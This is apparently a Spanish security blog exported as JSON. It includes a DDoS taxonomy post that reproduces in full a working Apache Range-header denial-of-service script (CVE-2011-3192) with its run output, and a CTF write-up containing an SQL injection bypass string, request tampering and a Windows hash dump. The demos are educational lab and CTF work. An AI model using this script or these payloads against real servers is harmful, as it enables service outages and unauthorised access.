[{"categories":null,"contents":"Este proyecto se trata de un bot de Telegram con la capacidad de ejecutar comandos de terminal desde tu cuenta de Telegram y con la respuesta del comando como mensajes.\nInicialmente este proyecto lo comencé por necesidades personales, pero decidí liberarlo por la segura necesidad de muchos con el mismo problema que me encontré, y tomando como base un proyecto de Va5c0.\nMuchas veces pasa en un pentest o más aun un bug bounty, que se necesita enumerar los objetivos o procesos que toman mucho tiempo como ciertos tipos de escaneos de nmap, crackear algún hash. Y muchas veces por ese motivo paso a dejar ese proceso trabajando fijándome si ya termino o no, dejando la computadora encendida, en algunas ocasiones sin nada más que hacer, toco veces en que ya debía salir y apagar la computadora dejando todo el proceso previo sin resultados. Es un gran coste de tiempo y dinero.\nPor lo que ahora comparto este pequeño proyecto de un bot(al que le bautice como Bot Bounty) que pueda ser utilizado tanto por una sola persona o varias, como una empresa que tenga esta misma necesidad para mejorar la productividad. Ya sea en una computadora, vps o una Raspberry. Conservando el grado de seguridad de que nadie más que las personas que se autoricen a usar el bot podrán utilizarlo (por si alguien externo llegara a encontrarse con el bot y tratara de utilizarlo).\nEl bot tiene opciones predefinidas para un acceso rápido a información que puede ser útil para el uso del bot. Por mencionar algunos: el espacio en RAM disponible (opción info serv/RAM), o la IP publica que tiene el dispositivo en el que corre el bot.\nAdemás, con el comando /exec se puede ejecutar cualquier comando que esté disponible en nuestra terminal del dispositivo a usar, por ejemplo:\nLimitándose así para comandos que requieran interacción, como alguna instalación sin forzar con el típico -y o logearse vía SSH, por nombrar unos ejemplos.\nPor defecto en su primer release viene con comandos rápidos de amass y nmap, para empezar a usarlos en un pentest o bug bounty. por ejemplo, en amass, el comando es /amassenum, el cual llama a $ amass enum -d para realizar una enumeración de subdominios:\nEn nmap tenemos un escaneo con los scripts, por default, sacar las versiones de los puertos encontrados, evitar realizar el descubrimiento del host (verificar si está vivo), y buscar en todos los puertos posibles; es decir: $ nmap -sC -sV -Pn -p-\nClaro que para lograr utilizar estos comandos deberá estar instaladas las herramientas en el sistema que estén utilizando para correr el bot (además que se las pueda llamar directamente en consola)\nComo primer release, solamente se tienen esos comandos, sin embargo quedo a la espera de otros comandos de atajo para añadir al bot que sugieran. Además, si encuentran errores me pueden escribir o lanzar un issue en el repositorio.\nEl repositorio es el siguiente: Bot Bounty\nConfiguraciones previas Para poder usarlo previamente deberán crearse un bot en Telegram reemplazar la API KEY que da por el valor que se especifica en el script en la línea 12.\n1TOKEN = \u0026#39;XXXXXX:XXXXXXXXXXXXXXXX\u0026#39; Además de registrar el ID de usuario(s) que usaran el bot, en la línea 14:\n1authorizedUsers = [123456789, 987654321] Y ahora simplemente queda correr el script\n1$ python3 bot.py Tips Si el output del comando es demasiado grande, debe guardarla en un archivo y sin output.\npor ejemplo:\n \\nmapadv example.com \u0026gt; resultadosExample.txt \\nmapadv example.com -oN resultadosExample.txt \\exec echo 'awesome bot!' \u0026gt; yesItIs.txt  Para revisar posibles usuarios no autorizados tratando de usar el bot, se guarda un registro de todos los comandos ejecutados con detalles de usuario en el archivo logFileBot.txt\nY eso sería por ahora, espero sea bien recibido este trabajo.\n-Hackers are People Too 😜\n","permalink":"https://drayko.github.io/es/post/bot-bounty-telegram-bot/","tags":["bot","featured","bug bounty","pentest","tool"],"title":"Bot Bounty, un bot para Pentesting y Bug Bounty"},{"categories":null,"contents":"Hace siete años empecé con la seguridad informática. Tengo más conocimientos acerca de web testing y pentesting con algunos premios en eso y también en otras áreas. Me interesa poder contribuir a la mejora de la seguridad informática en la sociedad de lo importante que es; no es un gasto, es una inversión.\n.bmc-button img{height: 34px !important;width: 35px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{padding: 7px 15px 7px 10px !important;line-height: 35px !important;height:51px !important;text-decoration: none !important;display:inline-flex !important;color:#FFFFFF !important;background-color:#FF813F !important;border-radius: 8px !important;border: 1px solid transparent !important;font-size: 24px !important;letter-spacing: 0.6px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Cookie', cursive !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#FFFFFF !important;}🍺Buy me a Beer ","permalink":"https://drayko.github.io/es/about/","tags":null,"title":"Acerca de"},{"categories":null,"contents":"Este post surgio por un trabajo de la universidad(para una Raspberry) sin embargo me sirvio con otras necesidades similares, para conectarse de manera remota sin necesidad de abrir puertos en el router.\nPara lograr una conexión SSH(u otro protocolo) fuera del área local, de manera sencilla, me parece esta, por distintos motivos(podría ser habilitando puertos en el router, solo que esto según la operadora puede llegar a ser muy difícil de lograr por sus políticas entre otras cosas), entonces continuemos, se necesita instalar Ngrok En el caso de una Raspberry se necesita la versión Linux(ARM) o en consola:\n1wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip luego se hace el unzip tal como explica el tutorial de ngrok en consola:\n1unzip ngrok-stable-linux-arm.zip Lo siguiente es registrarse y/o ingresar en ngrok, y una vez ahí se van a este link donde les mostrara el token para su cuenta Una vez sabiendo su token ejecutan en su dispositivo:\n1./ngrok authtoken XXXXXtuTokenAquiXXXXXXX con eso estaría configurado, solo falta poner a la escucha el puerto 22, que se utiliza SSH, de la siguiente forma\n1./ngrok tcp 22 es entonces cuando les muestra el Host y puerto al que apuntara Lo cual muestra en Forwarding la dirección TCP y puerto que nos habilitan para trabajar con nuestra Raspberry.\nEn este caso era 0.tcp.ngrok.io y puerto 17271, es decir que en vez de nuestra ip local y puerto por defecto(22), se debe especificar estos para acceder fuera del área local a nuestro dipositivo, es decir:\n1ssh pi@0.tcp.ngrok.io -p17271 y esito sería :D En la pagina de ngrok pueden revisar la variedad e protocolos disponbles, con la misma logica\n-Hackers are People Too 😜\n","permalink":"https://drayko.github.io/es/post/ssh-fuera-de-la-red-local/","tags":["Redes","SSH","Network","Ngrok"],"title":"Conexión SSH fuera de la red local"},{"categories":null,"contents":" Ataque de negación de servicio distribuido(DDoS por sus siglas en inglés, Distributed Denial of Service) se lleva a cabo generando un gran flujo de información desde varios puntos de conexión hacia un mismo punto de destino. En este Post se mostrarán 2 tipos de taxonomías para clasificarlos por ataques y contramedidas, esto para resaltar similitudes, características y estrategias con la intención de diseñar medidas al respecto.\n Introducción El desarrollo y uso de las técnicas de ataques DDoS se incrementaron en el transcurso de tiempo al igual que los atacantes constantemente modifican el enfoque de los mismos, este estudio trata de cubrir tanto los ataques conocidos como posibles modificaciones, divididas o niveles.\nAspectos generales que hace posible los ataques DDOS? según como está diseñado Internet, sigue un paradigma end-to-end, por lo que, en una comunicación en 2 vías, no existe un tercero que pueda controlar la posibilidad de que se envíen paquetes maliciosos, para poder detenerlos inmediatamente. Además de la posibilidad de realizar IP Spoofing, lo cual dificulta aún más su control sin afectar clientes verdaderos del Host víctima.\ncómo se realizan los ataques de DDOS? Para empezar, constan de distintas fases. Usualmente con la ayuda de escaneos automáticos se buscan dispositivos que puedan llegar a ser vulnerables, en palabras simples, empieza el reclutamiento del ejercito; Teniendo identificados estos, son explotados o infectados de igual manera automáticamente en lo general, para introducir el código malicioso que servirá posteriormente para con estos nuevos reclutas continuar con un mayor reclutamiento, yo lo llamaría como una estafa piramidal.\npor que se realizan los ataques de DDOS? Usualmente son por motivos personales(venganza) o reputación (conseguir respeto y fama). Sin embargo, también son realizados por motivos económicos (dañar a un competidor) y políticos (como una guerra en la que se podría dejar a todo un país sin servicios de internet, un hecho que Rusia hace poco tomo en cuenta y trabaja en mejorar su independencia en servicios de internet y contramedidas ante esto).\nTaxonomía de ataques DDOS DA: Degree of Automation (Grado de automatización) DA-1 Manual Las fases mencionadas anteriormente de escaneo y explotación son realizadas por el atacante de forma manual en su completitud.\nDA-2 Semi-Automatic\n...\nTaxonomía de mecanismos de defensa DDOS\nPara más detalles sobre cada clasificación, aquí el artículo.\n Demo Time | CVE-2011-3192 Para dar un ejemplo práctico de un ataque DDOS tome como caso de estudio el ataque denominado ApacheKiller, que permite a los atacantes realizar una denegación de servicio (consumo de memoria y CPU) a través del Header Range que expresa múltiples rangos superpuestos, y que este tiene asignado el CVE-2011-3192. Tiene como versiones afectadas en Apache HTTP Server 1.3.x, 2.0.x hasta 2.0.64 y 2.2.x hasta 2.2.19. En mi caso use Window$7 como Host Victima con Apache v2.2.15 y con un script hecho en python para realizar el ataque.\nPaso 1 Instalar y correr una versión Apache vulnerable descrita previamente Paso 2 Realice un pequeño test, para que puedan observar a detalle el Request, en el que además nos manda la versión de Apache que se utiliza, esto en un Test ya remunerado o Bug Bounty puede sernos de mucha utilidad claramente. Paso 3 Con el script realizado en Python por Miroslav Stampar hacemos el testeo\n1#!/usr/bin/env python 2 3import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse 4 5NAME = \u0026#34;KillApachePy (Range Header DoS CVE-2011-3192)\u0026#34; 6VERSION = \u0026#34;0.1c\u0026#34; 7AUTHOR = \u0026#34;Miroslav Stampar (@stamparm)\u0026#34; 8LICENSE = \u0026#34;Public domain (FREE)\u0026#34; 9SHORT = \u0026#34;You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better\u0026#34; 10REFERENCE = \u0026#34;http://seclists.org/fulldisclosure/2011/Aug/175\u0026#34; 11 12SLEEP_TIME = 3 # time to wait for new thread slots (after max number reached) 13RANGE_NUMBER = 1024 # number of range subitems forming the DoS payload 14USER_AGENT = \u0026#34;KillApachePy (%s)\u0026#34; % VERSION 15 16def attack(url, user_agent=None, method=\u0026#39;GET\u0026#39;, proxy=None): 17 if \u0026#39;://\u0026#39; not in url: 18 url = \u0026#34;http://%s\u0026#34; % url 19 20 host = urlparse.urlparse(url).netloc 21 22 user_agent = user_agent or USER_AGENT 23 24 if proxy and not re.match(\u0026#39;\\Ahttp(s)?://[^:]+:[0-9]+(/)?\\Z\u0026#39;, proxy, re.I): 25 print \u0026#34;(x) Invalid proxy address used\u0026#34; 26 exit(-1) 27 28 proxy_support = urllib2.ProxyHandler({\u0026#39;http\u0026#39;: proxy} if proxy else {}) 29 opener = urllib2.build_opener(proxy_support) 30 urllib2.install_opener(opener) 31 32 class _MethodRequest(urllib2.Request): 33 \u0026#39;\u0026#39;\u0026#39; 34Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2 35\u0026#39;\u0026#39;\u0026#39; 36 def set_method(self, method): 37 self.method = method.upper() 38 39 def get_method(self): 40 return getattr(self, \u0026#39;method\u0026#39;, urllib2.Request.get_method(self)) 41 42 def _send(check=False): 43 \u0026#39;\u0026#39;\u0026#39; 44Send the vulnerable request to the target 45\u0026#39;\u0026#39;\u0026#39; 46 if check: 47 print \u0026#34;(i) Checking target for vulnerability...\u0026#34; 48 payload = \u0026#34;bytes=0-,%s\u0026#34; % \u0026#34;,\u0026#34;.join(\u0026#34;5-%d\u0026#34; % item for item in xrange(1, RANGE_NUMBER)) 49 try: 50 headers = { \u0026#39;Host\u0026#39;: host, \u0026#39;User-Agent\u0026#39;: USER_AGENT, \u0026#39;Range\u0026#39;: payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39; } 51 req = _MethodRequest(url, None, headers) 52 req.set_method(method) 53 response = urllib2.urlopen(req) 54 if check: 55 return response and (\u0026#39;byteranges\u0026#39; in repr(response.headers.headers) or response.code == 206) 56 except urllib2.URLError, msg: 57 if \u0026#39;timed out\u0026#39; in str(msg): 58 print \u0026#34;\\r(i) Server seems to be choked (\u0026#39;%s\u0026#39;)\u0026#34; % msg 59 else: 60 print \u0026#34;(x) Connection error (\u0026#39;%s\u0026#39;)\u0026#34; % msg 61 if check or \u0026#39;Forbidden\u0026#39; in str(msg): 62 os._exit(-1) 63 except Exception, msg: 64 raise 65 66 try: 67 if not _send(check=True): 68 print \u0026#34;(x) Target does not seem to be vulnerable\u0026#34; 69 else: 70 print \u0026#34;(o) Target seems to be vulnerable\\n\u0026#34; 71 quit = False 72 while not quit: 73 threads = [] 74 print \u0026#34;(i) Creating new threads...\u0026#34; 75 try: 76 while True: 77 thread = threading.Thread(target=_send) 78 thread.start() 79 threads.append(thread) 80 except KeyboardInterrupt: 81 quit = True 82 raise 83 except Exception, msg: 84 if \u0026#39;new thread\u0026#39; in str(msg): 85 print \u0026#34;(i) Maximum number of new threads created (%d)\u0026#34; % len(threads) 86 else: 87 print \u0026#34;(x) Exception occured (\u0026#39;%s\u0026#39;)\u0026#34; % msg 88 finally: 89 if not quit: 90 print \u0026#34;(o) Waiting for %dseconds to acquire new threads\u0026#34; % SLEEP_TIME 91 time.sleep(SLEEP_TIME) 92 print 93 except KeyboardInterrupt: 94 print \u0026#34;\\r(x) Ctrl-C was pressed\u0026#34; 95 os._exit(1) 96 97def main(): 98 print \u0026#34;%s#v%s\\nby: %s\\n\\n(Note(s): %s)\\n\u0026#34; % (NAME, VERSION, AUTHOR, SHORT) 99 parser = optparse.OptionParser(version=VERSION) 100 parser.add_option(\u0026#34;-u\u0026#34;, dest=\u0026#34;url\u0026#34;, help=\u0026#34;Target url (e.g. \\\u0026#34;http://www.target.com/index.php\\\u0026#34;)\u0026#34;) 101 parser.add_option(\u0026#34;--agent\u0026#34;, dest=\u0026#34;agent\u0026#34;, help=\u0026#34;User agent (e.g. \\\u0026#34;Mozilla/5.0 (Linux)\\\u0026#34;)\u0026#34;) 102 parser.add_option(\u0026#34;--method\u0026#34;, dest=\u0026#34;method\u0026#34;, default=\u0026#39;GET\u0026#39;, help=\u0026#34;HTTP method used (default: GET)\u0026#34;) 103 parser.add_option(\u0026#34;--proxy\u0026#34;, dest=\u0026#34;proxy\u0026#34;, help=\u0026#34;Proxy (e.g. \\\u0026#34;http://127.0.0.1:8118\\\u0026#34;)\u0026#34;) 104 options, _ = parser.parse_args() 105 if options.url: 106 result = attack(options.url, options.agent, options.method, options.proxy) 107 else: 108 parser.print_help() 109 110if __name__ == \u0026#34;__main__\u0026#34;: 111 main() Y configurandolo con el proxy de Burp Suite quedaría algo así en terminal:\n1root@lab:~# python Apachekiller.py -u 192.168.100.58 --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; 2KillApachePy (Range Header DoS CVE-2011-3192) #v0.1c 3by: Miroslav Stampar (@stamparm) 4 5(Note(s) You\u0026#39;ll typically have to wait for 10-20 iterations before first 6connection timeouts. More complex/bigger the page the better) 7 8(i) Checking target for vulnerability... 9(o) Target seems to be vulnerable 10(1) Creating new threads una vez ejecutado esto regresemos a ver nuestro servidor: Como pueden ver, el Uso de CPU esta hasta el tope, por lo cual podemos evidenciar la vulnerabilidad a la que es susceptible estas versiones de Apache sin embargo analicemos las peticiones que se enviaron. cómo ven, se envía peticiones con Range superpuestos por lo cual nuestro servidor debe procesar todo esto en mayor tiempo (consumiendo así recursos), lo cual a gran escala resulta fatal. Como tal este sería un ataque DOS, que sin embargo logro un 100% de Uso de CPU, ahora con un ataque simultaneo con más maquinas (DDOS), podría resultarnos en una pantalla azul, dejando abajo el servidor.\nEste sería un ejemplo en nuestra Taxonomía de un EW-1(Exploited Weakness to Deny Services:Semantic) dado que el ataque aprovecha un bug que resultó en estas versiones de Apache.\nUna solución a este problema sería una actualización del servidor y/o parches si los tuviera, también un WAF como modSecurity. Por esto la taxonomía a nuestro mecanismo de defensa contra el DDOS seria AL-1:PG-1:ST-1(Activity Level:Preventive - Prevention Goal:Attack Prevention - Secured Target: System Security).\nEso sería, si tuvieran dudas no duden en escribir. -Hackers are People Too 😜\n","permalink":"https://drayko.github.io/es/post/taxonomia-ddos/","tags":["Redes","curiosidades","Network","paper"],"title":"Taxonomía de ataques DDoS y mecanismos de defensa DDoS"},{"categories":null,"contents":"Si bien este post no es algo técnico como acostumbro, me parece bastante interesante.\nMandaron en la lista de correos de la Comunidad de Software Libre de Bolivia un enlace a un post en medium donde se listaban algunos de los artículos documentados sobre las primeras computadoras en cada país, y descubrir que en esa lista estaba Bolivia fue interesante(el artículo está entre la biblioteca de la ACM).\nLa primera computadora según este artículo es una IBM 1440(como se la ve en la imagen), la cual fue adquirida por la Corporación Minera Boliviana(COMIBOL).\nEl artículo fue publicado en 1969 pero en el mismo explica que el departamento creado para usar la máquina ya se encontraba en funcionamiento 3,5 años por lo que deduzco que la computadora llegó el año 1965 o 1966(si alguno podría confirmar esto sería increíble).\nFuera de esto, lo complicado a sus inicios como casi en cualquier equipo novedoso fue encontrar personal capacitado para el uso de esta máquina que estaba dispuesta para los procesos contables de la corporación, cosa que ponía en duda la utilidad dado el costo que supuso la computadora. Es por esto que se hicieron pruebas de aptitud para su manejo en donde 500 personas postularon pero solamente 6 aprobaron. Mandaron a este personal a capacitarse y también en el uso de COBOL y FORTRAN IV para que pueda ser usada en el procesamiento de datos.\nA pesar de que fue un gran avance tecnológico, aún se tenían dudas sobre este además de criticado, por que el personal previo que realizaba este trabajo contable a mano, tuvo que ser despedido prácticamente.\nEl coste del avance tecnológico para ciertos trabajos o carreras sigue siendo devastador hasta el día de hoy, por la automatización de procesos y aún más cuando ya se ve el uso de la \u0026quot;Inteligencia Artificial\u0026quot; en tantas áreas que parece ya innecesario el humano.\nSin embargo me parece que no es el final del camino para todos, es ley de la vida y naturaleza que el más fuerte o el que se adapte más rápido sobrevive; en este caso estar de la mano con la tecnología, solo no hay que rendirse.\n-Hackers are People Too\n","permalink":"https://drayko.github.io/es/post/la-primera-computadora-en-bolivia/","tags":["curiosidades"],"title":"La primera computadora en Bolivia"},{"categories":null,"contents":"Este CTF estuvo compuesto por 74 equipos de universidades convocadas a nivel nacional para nivel de pregrado y posgrado en el Congreso Internacional De Seguridad Informática (CIDSI) que fue organizado por la Agencia de Gobierno Electrónico y Tecnologías de Información y Comunicación (AGETIC) gracias a las gestiones del Centro de Gestión de Incidentes Informáticos(CGII) realizado del 29 de Noviembre al 1 de Diciembre del 2018.\nTerminando esta serie, y como mencione en el anterior post, en este participamos en Equipo como Dark Army con Israel, Rafael y mi persona, logrando resolver todos los retos; Sin embargo no pudimos recuperar todos los enunciados o las flags en especifico(Como fueron escritas en forma literal en el evento), pero están explicadas tal y como lo resolvimos en el CTF, el cual duro dos medias jornadas.\nNivel 1 1.1. Análisis de trafico 1  Bienvenidos. Una compañía dedicada a la banca los acaba de contratar para poder realizar un análisis de tráfico. El problema radica en que hay un empleado que esta filtrando direcciones de correo electrónico, al mismo tiempo otro empleado comenzó a pasar passwords que tienen privilegios de modificación de los salarios de los empleados. Tu misión es encontrar esa contraseña\n Pues para empezar nos dan una captura de trafico, en la cual al buscar con Wireshark encontramos una petición con el usuario y contraseña.\nentonces la flag es:\n1007  1.2 Web crawlers  Lastimosamente motores de búsqueda están indexando muchos páginas de este sitio web que son confidenciales para nosotros ! Sabes cual es el archivo para evitar que esto siga pasando ? ¿ Nadie quiere sitios totalmente indexados verdad?\n Esto es bastante fácil, la Flag esta dentro de los robots.txt, el cual proporciona información a los rastreadores de buscadores sobre las páginas o los archivos que pueden solicitar o no de tu sitio web.\n1http://url/robots.txt  1.3 Backups  Petróleos del Caribe nos pidió guardar un backup de su archivo jsp principal Lastimosamente el ingeniero a cargo se fue a una planta en medio del mar y no nos puede decir la extensión con los que los guardó. El director de suministros requiere el backup con urgencia, me ayudas a identificar en que archivo esta?. Hazlo pronto mi cargo esta en juego Recuerda que las extensiones mas comunes de backups son:\n bak old bakup save   En este había que se algo observativos, tanto en la pista como en lo que tenemos frente a nosotros, nos dice el jsp principal, lo que vendria a significar el index.jsp ademas que la pagina actual es http://url/index.jsp\nAsi que probando con las extenciones que nos sugieren, se logra llegar a la respuesta\n1http://url/index.jsp.bakup El cual contiene\n1\u0026lt;%@ page contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34; language=\u0026#34;java\u0026#34; import=\u0026#34;java.sql.*,java.io.*,java.net.*,org.owasp.encoder.Encode, dbProcs.*, utils.*\u0026#34; errorPage=\u0026#34;\u0026#34; %\u0026gt; 2\u0026lt;%@ page import=\u0026#34;java.util.Locale\u0026#34;%\u0026gt; 3\u0026lt;%@ include file=\u0026#34;translation.jsp\u0026#34; %\u0026gt; 4\u0026lt;% 5\tShepherdLogManager.logEvent(request.getRemoteAddr(), request.getHeader(\u0026#34;X-Forwarded-For\u0026#34;), \u0026#34;DEBUG: index.jsp *************************\u0026#34;); 6\tLocale lang = new Locale(Validate.validateLanguage(request.getSession())); 7/** 8El flag/bandera es: 402051f4be0cc3aad33bcf3ac3d6532b 9 */ 10%\u0026gt; entonces ahi es que nos da la flag\n1402051f4be0cc3aad33bcf3ac3d6532b  1.4 Programa programador  Uno de tus amigos te dejó una pista en el desarrollo de código java, pero debes resolver un acertijo matemático antes de dar con el resultado. El flag/bandera es la clave para ingresar a su sistema (El número menor que puedas encontrar). Pero esto es fácil para ti, total no son ecuaciones diferenciales\n nos dan un archivo en java\n1package exploit; 2import java.util.Scanner; 3 4public class KeithLikesToTroll { 5\tpublic static void main(String[] args){ 6\tint clave; 7 8\tScanner scn = new Scanner(System.in); 9\tSystem.out.print(\u0026#34;Introdusca la llave: \u0026#34;); 10\tclave = scn.nextInt(); 11\tscn.close(); 12 13\tif(1338557220 / clave * clave != 1338557220 \u0026amp;\u0026amp; clave \u0026gt; 0){ 14\tSystem.out.println(\u0026#34;Autenticacion correcta. La bandera es un número pequeño que te dejara entrar.\u0026#34;); 15\t}else{ 16\tSystem.out.println(\u0026#34;Autenticacion incorrecta.\u0026#34;); 17\t} 18\t} 19} El cual habría q compilarlo y ejecutarlo de manera q el menor numero resultante de correcto, con fuerza bruta se puede llegar rápidamente a este.\nLa Flag:\n18  1.5 Wifi admin panel  Estamos de vacaciones en el Caribe, lastimosamente por culpa de tu amigo el vuelo nos acaba de dejar y son 5 largas horas de espera en el aeropuerto. Otro de tus amigos se dio cuenta que pueden ingresar a internet gratis en el aeropuerto pero para ello debes ingresar al router ¿ Te animas a probar como loguearte?\n Para esto necesitamos observar bien, y la pista que nos dan es SMC Networks, el cual es una marca que produce Routers entre otras cosas, el cual con un poco de busqueda tenemos algunas combinaciones de Usuarios y Contraseñas por defecto el cual probamos hasta hallar el correcto y conseguir la flag\n Nivel 2 2.1 Esteganografia  Sabías que la técnica de ocultar mensajes u objetos dentro de imágenes de modo que no se perciba su existencia es esteganografia?. A nosotros nos encanta esta técnica. Así que dejare esta imagen por aquí y me iré muy lentamente\nimagen para descargar\n Este al principio nos desconcertó, sin embargo la solución es extrayendo cada cadena de caracteres imprimible en la imagen, usando strings desde consola(en Linux)\n1strings 8c373fd1a.jpeg Y la Flag:\n11e5b77443345620c52d23c73dc87521c  2.2 Forense  Un peligroso delincuente esta pasando mensajes ocultos en los pdf que envía su cómplice en el extranjero. Puedes hacer un análisis, ya casi eres un hacker Encontraste tu bandera? Descargar documento\n En este caso, analizar los metadatos nos da el botín; Con el uso de Exiftool:\n1exiftool CIDSI2018.pdf Y la Flag:\n1c47d187067c6cf9  2.3 Inyección SQL  Sabemos que el coyote compra todos sus artefactos de ACME, nos ayudas a mostrar todas las tuplas de la tabla para encontrar la trampa con la que finalmente atrape a su némesis?\n Al ver este pensé que llevaría un tiempo, sin embargo al intentar cualquier inyección aparecía una copia de la consulta realizada en la parte superior, muy al estilo Bricks. Por lo cual hallar la solución fue muy rápido, con una típica inyección de bypass.\n1\u0026#39;)or(\u0026#39;1\u0026#39;)=(\u0026#39;1 Lo cual nos dio la Flag.\n 2.4 Ingeniería inversa  Una de los peligros mas grandes en aplicaciones móviles es la ingeniería inversa. Porque podemos inspeccionar el código fuente y encontrar llaves de API, passwords, etc. Encontramos un archivo apk mientras revisabas recursos compartidos, por suerte lo guardamos ahora queremos saber que contiene Sera que puedes con el reto?. Existen varias herramientas para hacer ingeniería inversa a un archivo APK Descargar APK\n Como menciona en el enunciado, existen varias herramientas, preferí usar Apktool\n1apktool d reversing.apk lo cual nos brinda una carpeta con todo lo extraido, en el cual se puede realizar una busqueda rápida con grep\n1user@pc:# grep \u0026#34;bandera\u0026#34; . -R 2./reversing/smali/com/mobshep/reverseengineer/Reverse_Engineering.smali: const-string v0, \u0026#34;El flag/bandera es 9yfdsj3md0lq75\u0026#34; y la Flag!\n19yfdsj3md0lq75  Nivel 3 3.1 Análisis de trafico 2  Estamos realizando un análisis de tráfico porque detectamos que alguien esta filtrando información confidencial y es tan grande la cantidad de información que encima la comprimieron protegido por contraseña, pero hallar el password es fácil para ti. Ayudanos a encontrar el password que nos ayude a tener acceso a nuestra bandera Descargar captura\n Encontrar el zip no fue difícil, solo había que exportarlo con Export Packet Bytes o exportando todos los objetos. Una vez llegado a este punto el zip que obtenemos esta protegido con contraseña como menciona el enunciado, para eso tuvimos que observar la captura\nla contraseña del zip\n1azulcrema y la flag!!\n1IW{HTTP_BASIC_AUTH_IS_EASY}  3.2 Lista de usuarios  Un grupo de usuarios decidió quejarse porque no hay café en la cafetería, puedes creerlo?. Y uno de los usuarios parece que es el que se esta robando el café, claro que el muy vivo se oculto de la lista. Me ayudas a encontrarlo y devolver el café a nuestras vidas\n En este demore en darme cuenta, nos daban a elegir entre consultar la información de 5 usuarios, sin embargo, no había algo relevante entre ellos, intente buscar inspeccionando los elementos, y las peticiones, sin embargo la pista estaba en como se realizaban las peticiones.\n1POST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 2Host: 192.168.3.100 3Accept: ** 4Accept-Language: en-US,en:q-0.5 5Accept-Encoding: gzip, deflate 6Referer: https://192.168.3.100/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646eOf313a4.jsp 7Content-Type: application/X-wWW-form-urlencoded 8X-Requested-With: XMLHttpRequest 9Content-Length: 45 10Connection: close 11 12userId%5B%5D=cfcd208495d565ef66e7dff9f98764da La petición se identificaba de esta manera: cfcd208495d565ef66e7dff9f98764da, lo cual al verificar era un MD5 y en valor 0 en texto plano:\n1cfcd208495d565ef66e7dff9f98764da = 0 Al verificar los demás, funcionaban de la misma forma, así que genere una lista de números hasheados en MD5 para hacer peticiones hasta encontrar el usuario oculto, el cual no era mas del numero 20.\n 3.3 HASHDUMP  Encontrar la contraseña de administracion\n 1sistemas:500:9E689B23C4D33D88E4C560258374B547:7E058F739B8A1E67C00815FC1E5E0E25::: 2Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: 3nonadmin:1005:NO PASSWORD*********************:0CF3760C0B0EB9F570AACE7040DF6DB7::: 4contabilidad:1013:23AC1B85C36D31AAE45E0AE1804A24B0:DE6D8B1780A4F0714242AC53A6C2B2E8::: 5administrador:1014:CE9F401800DF01AFFF959C003A9671D0:A7B9ECDD64AA492E449E0A619FD16E4B::: 6gerencia:1015:4978646A5C99C2834D6A97A372D4BC83:C7994B298128024418AD0E9C5038570C::: Podemos ver que es un dump de los hashes de Windows(NTLM)\nEste tomo tiempo darse cuenta del truco, a simple vista uno piensa que la cuenta de administración seria la que lleva tal nombre o similar, sin embargo el truco estaba en el RID. El 500 pertenece a la cuenta de administración creada durante la instalacion de Sistema Operativo, apesar que en este caso se llama sistemas\nEntonces nos queda 2 vías encontralo por fuerza bruta/diccionario o buscarla, para ganar tiempo mejor buscarla y así tenemos, la flag!\n1coldplay  Nivel 4 4.1 Cracking rar  Los usuarios de la aseguradora SEGURITAS tienen loco al personal de sistemas con sus famosos cambios. Como si fueran a cambiar el mundo. Si eres astuto podrás acceder a la bandera que esta compreso y protegido con contraseña Un empleado de sistemas tiene una pista para ti. Su id de una popular red social es 0x5afa18273c14\n Descargar   Primero el id debemos convertirlo del Hexadecimal, entonces obtenemos: 100030193548308\nAhora en facebook buscamos el perfil: https://www.facebook.com/100030193548308 en el cual encontramos fotografías del empleado difundiendo información critica de la empresa como que para archivos rar la contraseña debe ser un numero de longitud 5, entonces lo único que nos queda es crackear el rar con un diccionario con todas las posibilidades de 5 dígitos numerales con John The Ripper.\n1john --wordlist=six --format=rar5 hashrar hashrar es el file donde se encuentra el hash del RAR, entonces, tenemos la contraseña.\n160372 Con esto podemos sacar la flag dentro del comprimido:\n18743b52063cd84097a65d1633f5c74f5  4.2 Sitio web banco  Para completar este reto debes crearte una cuenta de banco y trasferirle mas de 10000 bs. Cuando tengas esa cantidad en tu cuenta de banco, simplemente deslogeate y logueate de nuevo para que se te recompense con el flag/bandera  Para empezar hay que registrarse, y en la plataforma nos da la posibilidad de transferir dinero a otras cuentas\nSin embargo interceptando las peticiones era inseguras, similar a esto:\n1cuentaOrigen=4\u0026amp;cuentaDestino=2\u0026amp;monto=1200 entonces modificando la petición, podemos invertir esto\n1cuentaOrigen=2\u0026amp;cuentaDestino=4\u0026amp;monto=1200 de esta manera nos transferimos dinero a nosotros mismos, ahi el resultado:\nVoilà!\n10738FF78AE98A11F579A70F3F98468097426D4652B32A5F978818FC9CCB66CE74371A28833CC1A52854697C734D66249DB8E9AAB67F024262436EC8220C9OF11  Nivel 5 5.1 Exploiting  Estamos haciendo un desarrollo seguro, Tu reto es cambiar el flujo del programa para que se ejecute la función oculta vencer Una vez que lo logres te felicitare por tu éxito. La bandera es la dirección hexadecimal de la función vencer con el formato correcto (0x11223344) Descargar programa\n Para este teníamos que utilizar IdaPro, y buscar la dirección.\n10x080484BB Y esito seria!\nSin embargo no pudimos sacar el 1er puesto por seis puntos, por el tema que quienes resolvían primero un reto tenían puntos extras, pero quedamos muy contentos con el gran equipo que formamos; quedando en 2do lugar entre tantos 